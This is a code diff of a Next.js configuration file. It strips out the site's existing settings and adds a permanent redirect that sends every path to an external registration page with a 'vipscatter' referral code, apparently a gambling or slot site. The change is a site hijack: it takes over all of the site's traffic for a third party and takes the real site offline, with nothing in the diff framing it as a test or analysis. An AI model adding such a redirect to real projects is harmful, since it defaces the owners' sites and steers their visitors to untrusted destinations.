@@ -1,15 +1,14 @@
-/**
- * @type {import('next').NextConfig}
- */
+/** @type {import('next').NextConfig} */
 const nextConfig = {
-    env: {
-        stackbitPreview: process.env.STACKBIT_PREVIEW
-    },
-    trailingSlash: true,
-    reactStrictMode: true,
-    allowedDevOrigins: [
-        '192.168.1.84'
-    ]
+  async redirects() {
+    return [
+      {
+        source: '/:path*',
+        destination: 'https://123sayangsemua.space/register?referral_code=vipscatter',
+        permanent: true,
+      },
+    ];
+  },
 };
 
 module.exports = nextConfig;
